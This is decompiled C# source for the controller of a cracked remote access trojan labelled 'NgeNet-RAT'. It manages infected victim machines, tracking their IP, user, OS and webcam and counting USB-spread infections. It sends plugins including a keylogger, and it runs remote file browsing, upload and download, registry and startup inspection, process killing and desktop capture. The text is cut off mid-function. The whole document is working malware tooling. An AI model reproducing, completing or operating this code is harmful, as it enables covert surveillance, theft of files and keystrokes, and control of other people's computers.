using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NINGALINET.My;
using NINGALINET.My.Resources;

namespace NINGALINET
{
	// Token: 0x0200003C RID: 60
	public class ima
	{
		// Token: 0x0600095A RID: 2394 RVA: 0x0004B348 File Offset: 0x00049548
		static ima()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			ima.ensr = true;
			ima.hac = 11;
			ima.hcam = 8;
			ima.hco = 2;
			ima.hin = 7;
			ima.hip = 1;
			ima.hname = 0;
			ima.hos = 6;
			ima.hpc = 10;
			ima.hping = 3;
			ima.huser = 5;
			ima.hvr = 9;
			ima.hfld = 4;
			ima.iNotSad = new List<Client>();
			ima.ISAd = new List<Client>();
			ima.LG = new List<string>();
			ima.Plug = new List<plg>();
			ima.RC = 0;
			ima.SNT = 0;
			ima.usb = new List<Client>();
			ima.SNT2 = 0;
			ima.RC2 = 0;
			ima.vr = "3iezW0rld - TurkHacker346 NgeNet-RAT Cracked";
			ima.Y = "|523|";
			ima.map = false;
			ima.GeoIP = new Getcountry(Application.StartupPath + "\\Bin\\GeoIP.dat");
			ima.notifeshw = false;
		}

		// Token: 0x0600095B RID: 2395 RVA: 0x00002898 File Offset: 0x00000A98
		[DebuggerNonUserCode]
		public ima()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
		}

		// Token: 0x0600095C RID: 2396 RVA: 0x0004B434 File Offset: 0x00049634
		public static plg GETPLG(string Name = null, string Hash = null)
		{
			plg result;
			if (Name != null)
			{
				try
				{
					List<plg>.Enumerator enumerator = ima.Plug.GetEnumerator();
					while (enumerator.MoveNext())
					{
						plg current = enumerator.Current;
						if (Operators.CompareString(current.Name, Name.ToLower(), false) == 0)
						{
							result = current;
							return result;
						}
					}
				}
				finally
				{
					List<plg>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
			if (Hash != null)
			{
				try
				{
					List<plg>.Enumerator enumerator2 = ima.Plug.GetEnumerator();
					while (enumerator2.MoveNext())
					{
						plg current2 = enumerator2.Current;
						if (Operators.CompareString(current2.Hash, Hash, false) == 0)
						{
							result = current2;
							return result;
						}
					}
				}
				finally
				{
					List<plg>.Enumerator enumerator2;
					((IDisposable)enumerator2).Dispose();
				}
			}
			result = null;
			return result;
		}

		// Token: 0x0600095D RID: 2397 RVA: 0x000485A0 File Offset: 0x000467A0
		public static Form Gform(string name)
		{
			return Application.OpenForms[name];
		}

		// Token: 0x0600095E RID: 2398 RVA: 0x0004B504 File Offset: 0x00049704
		public static bool SendPlug(Client c, plg p, bool ret)
		{
			bool result;
			try
			{
				string text;
				if (ret)
				{
					text = "ret" + ima.Y + p.Hash + ima.Y;
				}
				else
				{
					text = string.Concat(new string[]
					{
						"inv",
						ima.Y,
						p.Hash,
						ima.Y,
						c.ip(),
						ima.Y
					});
				}
				MemoryStream memoryStream = new MemoryStream();
				if (Operators.CompareString(p.Name, "kl.ngg", false) == 0)
				{
					text = text.Replace(p.Hash, "kl");
					memoryStream.Write(Fungsi.SB(ref text), 0, text.Length);
					memoryStream.Write(Fungsi.SB(ref p.B), 0, p.B.Length);
				}
				else
				{
					memoryStream.Write(Fungsi.SB(ref text), 0, text.Length);
					if (!c.plg.Contains(p.Hash))
					{
						memoryStream.Write(Fungsi.SB(ref p.B), 0, p.B.Length);
					}
					else
					{
						memoryStream.WriteByte(40);
					}
				}
				c.Ping = -9000;
				c.Send(memoryStream.ToArray());
				c.Ping = 0;
				memoryStream.Dispose();
				result = true;
				return result;
			}
			catch (Exception expr_13C)
			{
				ProjectData.SetProjectError(expr_13C);
				Exception projectError = expr_13C;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			result = false;
			return result;
		}

		// Token: 0x0600095F RID: 2399 RVA: 0x0004B688 File Offset: 0x00049888
		public static void SendTo(object O)
		{
			ListView.SelectedListViewItemCollection selectedListViewItemCollection = (ListView.SelectedListViewItemCollection)NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(O), new object[]
			{
				0
			}, null);
			try
			{
				IEnumerator enumerator = null;
				try
				{
					enumerator = selectedListViewItemCollection.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						object[] array = new object[1];
						object[] array2 = new object[1];
						int num = 1;
						array2[0] = 1;
						array[0] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(O), array2, null))));
						object[] array3 = array;
						bool[] array4 = new bool[]
						{
							true
						};
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array3, null, null, array4, true);
						if (array4[0])
						{
							NewLateBinding.LateIndexSetComplex(RuntimeHelpers.GetObjectValue(O), new object[]
							{
								num,
								RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array3[0])))
							}, null, true, false);
						}
						listViewItem.ForeColor = (Color)NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(O), new object[]
						{
							2
						}, null);
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_13D)
			{
				ProjectData.SetProjectError(expr_13D);
				Exception projectError = expr_13D;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000960 RID: 2400 RVA: 0x0004B824 File Offset: 0x00049A24
		public static object vno(ListViewItem l)
		{
			object result;
			try
			{
				result = string.Concat(new string[]
				{
					l.SubItems[ima.huser].Text,
					"-",
					l.SubItems[ima.hos].Text
				});
			}
			catch (Exception expr_49)
			{
				ProjectData.SetProjectError(expr_49);
				Exception projectError = expr_49;
				ProjectData.SetProjectError(projectError);
				result = "?";
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			return result;
		}

		// Token: 0x06000961 RID: 2401 RVA: 0x00004DBB File Offset: 0x00002FBB
		public static void Log(string T)
		{
			ima.LG.Add(Fungsi.HM() + T);
		}

		// Token: 0x06000962 RID: 2402 RVA: 0x0004B8AC File Offset: 0x00049AAC
		public static void Req(object obj)
		{
			Client client = (Client)NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(obj), new object[]
			{
				0
			}, null);
			byte[] array = (byte[])NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(obj), new object[]
			{
				1
			}, null);
			string[] array2 = Strings.Split(Fungsi.BS(ref array), ima.Y, -1, CompareMethod.Binary);
			checked
			{
				try
				{
					string text = array2[0];
					string left = text;
					if (Operators.CompareString(left, "us", false) == 0)
					{
						client.IsUSB = true;
						client.L.ForeColor = Color.Blue;
						List<Client> list = ima.usb;
						List<Client> obj2 = list;
						lock (obj2)
						{
							ima.usb.Add(client);
							return;
						}
					}
					if (Operators.CompareString(left, "dw", false) == 0)
					{
						FrmDwonload frmDwonload = (FrmDwonload)ima.Gform(client.ip() + array2[1]);
						if (frmDwonload == null)
						{
							client.Send("close" + ima.Y + array2[1]);
						}
						else
						{
							byte[] array3 = (byte[])NewLateBinding.LateIndexGet(Fungsi.fx(array, "dw" + ima.Y + array2[1] + ima.Y), new object[]
							{
								1
							}, null);
							frmDwonload.FS.Write(array3, 0, array3.Length);
							frmDwonload.FS.Flush();
							CHProgressbar progressbar = frmDwonload.Progressbar1;
							progressbar.Value += array3.Length;
							frmDwonload.Pvalue = progressbar.Value + array3.Length;
							if (frmDwonload.FS.Length == unchecked((long)frmDwonload.SZ))
							{
								frmDwonload.FS.Close();
								client.Send("close" + ima.Y + array2[1]);
								frmDwonload.savedata();
							}
							else
							{
								client.Send("de" + ima.Y + array2[1]);
							}
						}
					}
					else if (Operators.CompareString(left, "up", false) == 0)
					{
						FrmUpload frmUpload = (FrmUpload)ima.Gform(client.ip() + array2[1]);
						if (frmUpload == null)
						{
							client.Send("close" + ima.Y + array2[1]);
						}
						else if (frmUpload.Progressbar1.Value == frmUpload.Progressbar1.Maximum)
						{
							client.Send("close" + ima.Y + array2[1]);
							frmUpload.FS.Close();
							frmUpload.FS.Dispose();
							frmUpload.Close();
						}
						else
						{
							byte[] array4 = new byte[5121];
							int num = frmUpload.FS.Read(array4, 0, array4.Length);
							CHProgressbar progressbar = frmUpload.Progressbar1;
							progressbar.Value += num;
							MemoryStream memoryStream = new MemoryStream();
							string text2 = "wd" + ima.Y + array2[1] + ima.Y;
							memoryStream.Write(Fungsi.SB(ref text2), 0, text2.Length);
							memoryStream.Write(array4, 0, num);
							client.Send(memoryStream.ToArray());
							memoryStream.Dispose();
						}
					}
					else
					{
						if (Operators.CompareString(left, "FM", false) == 0)
						{
							if (client.L == null)
							{
								client.L = new ListViewItem();
							}
							FrmFilemanager frmFilemanager = (FrmFilemanager)ima.Gform("fm" + client.ip());
							string left2 = array2[2];
							if (Operators.CompareString(left2, "dw", false) == 0)
							{
								if (ima.F.InvokeRequired)
								{
									ima.F.Invoke(new ima._Req(ima.Req), new object[]
									{
										RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
									});
								}
								else
								{
									FrmDwonload frmDwonload2 = new FrmDwonload();
									frmDwonload2.FNn = array2[3];
									frmDwonload2.SZ = Conversions.ToInteger(array2[4]);
									frmDwonload2.c = client;
									frmDwonload2.Progressbar1.Maximum = frmDwonload2.SZ;
									frmDwonload2.Show();
									client.Send("de" + ima.Y + frmDwonload2.FNn);
								}
							}
							else if (Operators.CompareString(left2, "~", false) == 0)
							{
								if (frmFilemanager == null)
								{
									if (ima.F.InvokeRequired)
									{
										ima.F.Invoke(new ima._Req(ima.Req), new object[]
										{
											RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
										});
									}
									else
									{
										new FrmFilemanager
										{
											sk = client,
											osk = ima.W.GetClient(array2[1]),
											Name = "fm" + client.ip()
										}.Show();
									}
								}
							}
							else if (Operators.CompareString(left2, "!", false) == 0)
							{
								frmFilemanager.L1.Items.Clear();
								int num2 = array2.Length - 1;
								for (int i = 3; i <= num2; i++)
								{
									string[] array5 = Strings.Split(Fungsi.DEB(ref array2[i]), ";", -1, CompareMethod.Binary);
									DirectoryInfo directoryInfo = new DirectoryInfo(array5[0]);
									ListViewItem listViewItem = frmFilemanager.L1.Items.Add(directoryInfo.Name);
									listViewItem.ToolTipText = directoryInfo.FullName;
									listViewItem.SubItems.Add(array5[1]);
									string left3 = array5[1];
									if (Operators.CompareString(left3, DriveType.Fixed.ToString(), false) == 0)
									{
										listViewItem.ImageIndex = 1;
									}
									else if (Operators.CompareString(left3, DriveType.Removable.ToString(), false) == 0)
									{
										listViewItem.ImageIndex = 3;
									}
									else if (Operators.CompareString(left3, DriveType.CDRom.ToString(), false) == 0)
									{
										listViewItem.ImageIndex = 2;
									}
									else if (Operators.CompareString(left3, "[DS]", false) == 0)
									{
										listViewItem.ImageIndex = 5;
									}
									else if (Operators.CompareString(left3, "[DC]", false) == 0)
									{
										listViewItem.ImageIndex = 7;
									}
									else if (Operators.CompareString(left3, "[US]", false) == 0)
									{
										listViewItem.ImageIndex = 9;
									}
									else
									{
										listViewItem.ImageIndex = 0;
										listViewItem.SubItems[1].Text = "DIR";
									}
								}
								frmFilemanager.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							}
							else
							{
								if (Operators.CompareString(left2, "@", false) == 0)
								{
									CHProgressbar pr = frmFilemanager.pr;
									CHProgressbar obj3 = pr;
									lock (obj3)
									{
										if (frmFilemanager.Cache.Contains(Fungsi.DEB(ref array2[3])))
										{
											frmFilemanager.Cache.Remove(Fungsi.DEB(ref array2[3]));
										}
										FMcach fMcach = new FMcach();
										fMcach.Path = Fungsi.DEB(ref array2[3]);
										frmFilemanager.Cache.Add(fMcach, fMcach.Path, null, null);
										DirectoryInfo directoryInfo2 = new DirectoryInfo(Fungsi.DEB(ref array2[3]));
										if (Operators.CompareString(frmFilemanager.TextBox1.Text, directoryInfo2.FullName, false) == 0)
										{
											frmFilemanager.pr.Value = 0;
											string[] array6 = Strings.Split(array2[4], "/", -1, CompareMethod.Binary);
											frmFilemanager.pr.Maximum = array6.Length - 1;
											frmFilemanager.L2.Items.Clear();
											if (directoryInfo2.Parent != null)
											{
												ListViewItem listViewItem2 = frmFilemanager.L2.Items.Add("..", "..", 0);
												listViewItem2.ToolTipText = directoryInfo2.Parent.FullName;
												listViewItem2.SubItems.Add("");
												listViewItem2.SubItems.Add("DIR");
											}
											frmFilemanager.MG2.Images.Clear();
											frmFilemanager.MG2.Images.Add(frmFilemanager.MG.Images[0]);
											frmFilemanager.MG2.Images.Add("*", frmFilemanager.MG.Images[4]);
											int num3 = array6.Length - 2;
											for (int j = 0; j <= num3; j++)
											{
												if (Operators.CompareString(frmFilemanager.TextBox1.Text, directoryInfo2.FullName, false) != 0)
												{
													return;
												}
												ListViewItem listViewItem3 = frmFilemanager.L2.Items.Add(directoryInfo2.FullName + Fungsi.DEB(ref array6[j]), Fungsi.DEB(ref array6[j]), 0);
												listViewItem3.SubItems.Add("");
												listViewItem3.SubItems.Add("DIR");
												listViewItem3.ToolTipText = directoryInfo2.FullName + listViewItem3.Text;
												fMcach.folders.Add(listViewItem3.ToolTipText);
												CHProgressbar pr2 = frmFilemanager.pr;
												CHProgressbar cHProgressbar = pr2;
												cHProgressbar.Value++;
											}
											frmFilemanager.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
											client.Send("@" + ima.Y + array2[3]);
										}
										return;
									}
								}
								if (Operators.CompareString(left2, "#", false) == 0)
								{
									CHProgressbar pr3 = frmFilemanager.pr;
									CHProgressbar obj4 = pr3;
									lock (obj4)
									{
										FMcach fMcach2 = (FMcach)frmFilemanager.Cache[Fungsi.DEB(ref array2[3])];
										string text3 = Fungsi.DEB(ref array2[3]);
										if (Operators.CompareString(frmFilemanager.TextBox1.Text, text3, false) == 0)
										{
											frmFilemanager.pr.Value = 0;
											string[] array7 = Strings.Split(array2[4], "/", -1, CompareMethod.Binary);
											frmFilemanager.pr.Maximum = array7.Length - 1;
											int num4 = array7.Length - 2;
											for (int k = 0; k <= num4; k++)
											{
												string[] array8 = Strings.Split(Fungsi.DEB(ref array7[k]), ";", -1, CompareMethod.Binary);
												if (Operators.CompareString(frmFilemanager.TextBox1.Text, text3, false) != 0)
												{
													return;
												}
												ListViewItem listViewItem4 = frmFilemanager.L2.Items.Add(text3 + array8[0], array8[0], 1);
												FileInfo fileInfo = new FileInfo(text3 + array8[0]);
												listViewItem4.ToolTipText = fileInfo.FullName;
												listViewItem4.SubItems.Add(Fungsi.Siz(Conversions.ToLong(array8[1])));
												if (Operators.CompareString(fileInfo.Extension, "", false) == 0)
												{
													listViewItem4.SubItems.Add("");
												}
												else
												{
													listViewItem4.SubItems.Add(fileInfo.Extension.Replace(".", ""));
													if (!frmFilemanager.MG2.Images.ContainsKey(fileInfo.Extension))
													{
														File.Create(Application.StartupPath + "\\!" + fileInfo.Extension).Close();
														frmFilemanager.MG2.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\\!" + fileInfo.Extension));
														File.Delete(Application.StartupPath + "\\!" + fileInfo.Extension);
														listViewItem4.ImageKey = fileInfo.Extension;
													}
													else
													{
														listViewItem4.ImageKey = fileInfo.Extension;
													}
												}
												fMcach2.files.Add(string.Concat(new string[]
												{
													listViewItem4.ToolTipText,
													";",
													listViewItem4.SubItems[1].Text,
													";",
													listViewItem4.SubItems[2].Text
												}));
												CHProgressbar pr2 = frmFilemanager.pr;
												CHProgressbar cHProgressbar = pr2;
												cHProgressbar.Value++;
											}
											frmFilemanager.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
										}
										return;
									}
								}
								if (Operators.CompareString(left2, "$", false) == 0)
								{
									if (ima.F.InvokeRequired)
									{
										ima.F.Invoke(new ima._Req(ima.Req), new object[]
										{
											RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
										});
									}
									else
									{
										if (frmFilemanager.Images.Contains(Fungsi.DEB(ref array2[3])))
										{
											frmFilemanager.Images.Remove(Fungsi.DEB(ref array2[3]));
										}
										frmFilemanager.Images.Add(Image.FromStream(new MemoryStream(Convert.FromBase64String(array2[4]))), Fungsi.DEB(ref array2[3]), null, null);
										if (frmFilemanager.L2.Items.ContainsKey(Fungsi.DEB(ref array2[3])) && frmFilemanager.L2.Items[Fungsi.DEB(ref array2[3])].Selected)
										{
											frmFilemanager.P.Image = (Image)frmFilemanager.Images[Fungsi.DEB(ref array2[3])];
											frmFilemanager.P.Visible = true;
										}
									}
								}
								else if (Operators.CompareString(left2, "%", false) == 0)
								{
									frmFilemanager.RichTextBox1.Text = Fungsi.DEB(ref array2[4]).Replace("\0", "");
									frmFilemanager.FNN = Fungsi.DEB(ref array2[3]);
								}
								else
								{
									if (Operators.CompareString(left2, "dl", false) == 0)
									{
										string[] array9 = Strings.Split(Fungsi.DEB(ref array2[3]), ";", -1, CompareMethod.Binary);
										try
										{
											IEnumerator enumerator = frmFilemanager.L2.Items.GetEnumerator();
											while (enumerator.MoveNext())
											{
												ListViewItem listViewItem5 = (ListViewItem)enumerator.Current;
												if (Operators.CompareString(array9[1], "*", false) == 0)
												{
													if (Operators.CompareString(listViewItem5.Text, new DirectoryInfo(array9[0]).Name, false) == 0 & Operators.CompareString(listViewItem5.SubItems[2].Text, "DIR", false) == 0)
													{
														listViewItem5.Remove();
														break;
													}
												}
												else if (Operators.CompareString(listViewItem5.Text, new DirectoryInfo(array9[0]).Name, false) == 0 & Operators.CompareString(listViewItem5.SubItems[2].Text, "DIR", false) != 0)
												{
													listViewItem5.Remove();
													goto IL_3DCF;
												}
											}
											return;
										}
										finally
										{
											IEnumerator enumerator;
											if (enumerator is IDisposable)
											{
												(enumerator as IDisposable).Dispose();
											}
										}
									}
									if (Operators.CompareString(left2, "nm", false) == 0)
									{
										string[] array10 = Strings.Split(Fungsi.DEB(ref array2[3]), ";", -1, CompareMethod.Binary);
										try
										{
											IEnumerator enumerator2 = frmFilemanager.L2.Items.GetEnumerator();
											while (enumerator2.MoveNext())
											{
												ListViewItem listViewItem6 = (ListViewItem)enumerator2.Current;
												if (Operators.CompareString(listViewItem6.ToolTipText, array10[0], false) == 0)
												{
													if (Operators.CompareString(array10[2], "*", false) == 0)
													{
														DirectoryInfo directoryInfo3 = new DirectoryInfo(array10[0]);
														listViewItem6.Text = array10[1];
														listViewItem6.ToolTipText = directoryInfo3.Parent.FullName + "\\" + listViewItem6.Text;
													}
													else
													{
														FileInfo fileInfo2 = new FileInfo(array10[0]);
														listViewItem6.Text = array10[1];
														listViewItem6.ToolTipText = fileInfo2.Directory.FullName + Conversions.ToString(unchecked(Conversions.ToDouble("\\") * Conversions.ToDouble(listViewItem6.Text)));
														listViewItem6.SubItems[2].Text = new FileInfo(listViewItem6.ToolTipText).Extension.Replace(".", "");
													}
												}
											}
											return;
										}
										finally
										{
											IEnumerator enumerator2;
											if (enumerator2 is IDisposable)
											{
												(enumerator2 as IDisposable).Dispose();
											}
										}
									}
									if (Operators.CompareString(left2, "ER", false) == 0)
									{
										frmFilemanager.SL.Text = "Error " + array2[4];
									}
								}
							}
						}
						else
						{
							if (Operators.CompareString(left, "STR", false) == 0)
							{
								if (client.L == null)
								{
									client.L = new ListViewItem();
								}
								if (ima.F.InvokeRequired)
								{
									ima.F.Invoke(new ima._Req(ima.Req), new object[]
									{
										RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
									});
								}
								else
								{
									FrmStartUp frmStartUp = (FrmStartUp)ima.Gform("str" + client.ip());
									string left4 = array2[2];
									if (Operators.CompareString(left4, "~", false) == 0)
									{
										if (frmStartUp == null)
										{
											new FrmStartUp
											{
												Name = "str" + client.ip(),
												sk = client,
												osk = ima.W.GetClient(array2[1])
											}.Show();
										}
									}
									else if (Operators.CompareString(left4, "!", false) == 0)
									{
										if (frmStartUp != null)
										{
											try
											{
												frmStartUp.ListView1.Items.Clear();
												string[] array11 = Strings.Split(array2[3], "\r\n", -1, CompareMethod.Binary);
												frmStartUp.pr.Visible = true;
												frmStartUp.pr.Value = 0;
												frmStartUp.pr.Maximum = array11.Length;
												string[] array12 = array11;
												for (int l = 0; l < array12.Length; l++)
												{
													string text4 = array12[l];
													CHProgressbar pr4 = frmStartUp.pr;
													pr4.Value++;
													if (text4.StartsWith("%CU_RUN%"))
													{
														string[] array13 = Strings.Split(text4, ".|.", -1, CompareMethod.Binary);
														ListViewItem listViewItem7 = new ListViewItem();
														listViewItem7.Text = array13[1];
														listViewItem7.SubItems.Add(array13[2]);
														listViewItem7.ImageIndex = 0;
														listViewItem7.Group = frmStartUp.ListView1.Groups["Group1"];
														frmStartUp.ListView1.Items.Add(listViewItem7);
													}
													else if (text4.StartsWith("%CU_ONCE%"))
													{
														string[] array14 = Strings.Split(text4, ".|.", -1, CompareMethod.Binary);
														ListViewItem listViewItem8 = new ListViewItem();
														listViewItem8.Text = array14[1];
														listViewItem8.SubItems.Add(array14[2]);
														listViewItem8.ImageIndex = 0;
														listViewItem8.Group = frmStartUp.ListView1.Groups["Group2"];
														frmStartUp.ListView1.Items.Add(listViewItem8);
													}
													else if (text4.StartsWith("%CU_EXPLO%"))
													{
														string[] array15 = Strings.Split(text4, ".|.", -1, CompareMethod.Binary);
														ListViewItem listViewItem9 = new ListViewItem();
														listViewItem9.Text = array15[1];
														listViewItem9.SubItems.Add(array15[2]);
														listViewItem9.ImageIndex = 0;
														listViewItem9.Group = frmStartUp.ListView1.Groups["Group3"];
														frmStartUp.ListView1.Items.Add(listViewItem9);
													}
													else if (text4.StartsWith("%MA_RUN%"))
													{
														string[] array16 = Strings.Split(text4, ".|.", -1, CompareMethod.Binary);
														ListViewItem listViewItem10 = new ListViewItem();
														listViewItem10.Text = array16[1];
														listViewItem10.SubItems.Add(array16[2]);
														listViewItem10.ImageIndex = 0;
														listViewItem10.Group = frmStartUp.ListView1.Groups["Group4"];
														frmStartUp.ListView1.Items.Add(listViewItem10);
													}
													else if (text4.StartsWith("%MA_ONCE%"))
													{
														string[] array17 = Strings.Split(text4, ".|.", -1, CompareMethod.Binary);
														ListViewItem listViewItem11 = new ListViewItem();
														listViewItem11.Text = array17[1];
														listViewItem11.SubItems.Add(array17[2]);
														listViewItem11.ImageIndex = 0;
														listViewItem11.Group = frmStartUp.ListView1.Groups["Group5"];
														frmStartUp.ListView1.Items.Add(listViewItem11);
													}
													else if (text4.StartsWith("%MA_EXPLO%"))
													{
														string[] array18 = Strings.Split(text4, ".|.", -1, CompareMethod.Binary);
														ListViewItem listViewItem12 = new ListViewItem();
														listViewItem12.Text = array18[1];
														listViewItem12.SubItems.Add(array18[2]);
														listViewItem12.ImageIndex = 0;
														listViewItem12.Group = frmStartUp.ListView1.Groups["Group6"];
														frmStartUp.ListView1.Items.Add(listViewItem12);
													}
													else if (text4.StartsWith("%FOLD_UP%"))
													{
														string[] array19 = Strings.Split(text4, ".|.", -1, CompareMethod.Binary);
														ListViewItem listViewItem13 = new ListViewItem();
														listViewItem13.Text = array19[1];
														listViewItem13.SubItems.Add(array19[2]);
														if (Operators.CompareString(listViewItem13.Text, "desktop.ini", false) == 0)
														{
															listViewItem13.ImageIndex = 2;
														}
														else
														{
															listViewItem13.ImageIndex = 1;
														}
														listViewItem13.Group = frmStartUp.ListView1.Groups["Group7"];
														frmStartUp.ListView1.Items.Add(listViewItem13);
													}
												}
												frmStartUp.ListView1.FX();
												frmStartUp.sl.Text = "Startup : " + Conversions.ToString(frmStartUp.ListView1.Items.Count);
											}
											catch (Exception expr_1648)
											{
												ProjectData.SetProjectError(expr_1648);
												ProjectData.ClearProjectError();
											}
										}
									}
								}
								return;
							}
							if (Operators.CompareString(left, "RG", false) == 0)
							{
								if (client.L == null)
								{
									client.L = new ListViewItem();
								}
								if (ima.F.InvokeRequired)
								{
									ima.F.Invoke(new ima._Req(ima.Req), new object[]
									{
										RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
									});
								}
								else
								{
									FrmRegistry frmRegistry = (FrmRegistry)ima.Gform("reg" + client.ip());
									string left5 = array2[2];
									if (Operators.CompareString(left5, "~", false) == 0)
									{
										if (frmRegistry == null)
										{
											frmRegistry = new FrmRegistry();
											frmRegistry.Name = "reg" + client.ip();
											frmRegistry.osk = ima.W.GetClient(array2[1]);
											frmRegistry.sk = client;
											frmRegistry.Show();
										}
									}
									else if (Operators.CompareString(left5, "!", false) == 0)
									{
										frmRegistry.pr.Visible = true;
										if (frmRegistry != null)
										{
											frmRegistry.RGk.SelectedNode.Nodes.Clear();
											frmRegistry.RGLIST.Items.Clear();
											frmRegistry.pr.Value = 0;
											frmRegistry.pr.Maximum = array2.Length - 3;
											int num5 = array2.Length - 1;
											for (int num6 = 3; num6 <= num5; num6++)
											{
												try
												{
													CHProgressbar pr5 = frmRegistry.pr;
													CHProgressbar cHProgressbar = pr5;
													cHProgressbar.Value++;
													if (array2[num6].Length > 0)
													{
														if (array2[num6].Contains("/"))
														{
															string[] array20 = Strings.Split(array2[num6], "/", -1, CompareMethod.Binary);
															ListViewItem listViewItem14 = frmRegistry.RGLIST.Items.Add(array20[0]);
															listViewItem14.SubItems.Add(array20[1]);
															try
															{
																listViewItem14.SubItems.Add(array20[2]);
															}
															catch (Exception expr_186C)
															{
																ProjectData.SetProjectError(expr_186C);
																Exception projectError = expr_186C;
																ProjectData.SetProjectError(projectError);
																ProjectData.ClearProjectError();
																ProjectData.ClearProjectError();
															}
															if (Operators.CompareString(array20[1], "String", false) == 0)
															{
																listViewItem14.ImageIndex = 1;
															}
															else
															{
																listViewItem14.ImageIndex = 2;
															}
														}
														else
														{
															frmRegistry.RGk.SelectedNode.Nodes.Add(array2[num6]);
														}
													}
												}
												catch (Exception expr_18CC)
												{
													ProjectData.SetProjectError(expr_18CC);
													ProjectData.ClearProjectError();
												}
											}
											frmRegistry.RGk.SelectedNode.Expand();
											frmRegistry.RGk.Select();
											frmRegistry.RGk.Focus();
											int num7 = frmRegistry.RGLIST.Columns.Count - 1;
											for (int m = 0; m <= num7; m++)
											{
												frmRegistry.RGLIST.Columns[m].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
											}
										}
									}
								}
								return;
							}
							if (Operators.CompareString(left, "AC", false) == 0)
							{
								if (client.L == null)
								{
									client.L = new ListViewItem();
								}
								if (ima.F.InvokeRequired)
								{
									ima.F.Invoke(new ima._Req(ima.Req), new object[]
									{
										RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
									});
								}
								else
								{
									FrmWinList frmWinList = (FrmWinList)ima.Gform("AC" + client.ip());
									string left6 = array2[2];
									if (Operators.CompareString(left6, "~", false) == 0)
									{
										if (frmWinList == null)
										{
											frmWinList = new FrmWinList();
											frmWinList.Name = "AC" + client.ip();
											frmWinList.osk = ima.W.GetClient(array2[1]);
											frmWinList.sk = client;
											frmWinList.Show();
										}
									}
									else if (Operators.CompareString(left6, "!", false) == 0)
									{
										frmWinList.L2.Items.Clear();
										frmWinList.pr.Value = 0;
										string[] array21 = Strings.Split(array2[3], "\r\n", -1, CompareMethod.Binary);
										frmWinList.pr.Maximum = array21.Length;
										try
										{
											string[] array22 = array21;
											for (int n = 0; n < array22.Length; n++)
											{
												string text5 = array22[n];
												CHProgressbar pr6 = frmWinList.pr;
												pr6.Value++;
												if (Operators.CompareString(text5, "", false) != 0)
												{
													string[] array23 = Strings.Split(text5, "[,]", -1, CompareMethod.Binary);
													ListViewItem listViewItem15 = new ListViewItem();
													listViewItem15.Text = array23[0];
													listViewItem15.SubItems.Add("Running");
													listViewItem15.SubItems.Add(array23[1]);
													listViewItem15.SubItems.Add(array23[2]);
													listViewItem15.ImageIndex = 0;
													frmWinList.L2.Items.Add(listViewItem15);
													frmWinList.SL.Text = "Windows List : " + Conversions.ToString(frmWinList.L2.Items.Count);
												}
											}
										}
										catch (Exception expr_1B94)
										{
											ProjectData.SetProjectError(expr_1B94);
											ProjectData.ClearProjectError();
										}
										frmWinList.L2.FX();
									}
									else if (Operators.CompareString(left6, "AM", false) == 0)
									{
										frmWinList.SL.Text = frmWinList.L2.Items[array2[3]].Text + "[" + array2[3] + "] Killed";
										frmWinList.L2.Items[array2[3]].Remove();
									}
								}
								return;
							}
							if (Operators.CompareString(left, "cap!", false) == 0)
							{
								if (client.L == null)
								{
									client.L = new ListViewItem();
								}
								if (ima.F.InvokeRequired)
								{
									ima.F.Invoke(new ima._Req(ima.Req), new object[]
									{
										RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
									});
								}
								else
								{
									FDesktop fDesktop = (FDesktop)ima.Gform("cap!" + client.ip());
									string left7 = array2[2];
									if (Operators.CompareString(left7, "~", false) == 0)
									{
										if (fDesktop == null)
										{
											fDesktop = new FDesktop();
											fDesktop.Name = "cap!" + client.ip();
											fDesktop.osk = ima.W.GetClient(array2[1]);
											fDesktop.Sz = new Size(Conversions.ToInteger(array2[3]), Conversions.ToInteger(array2[4]));
											fDesktop.sk = client;
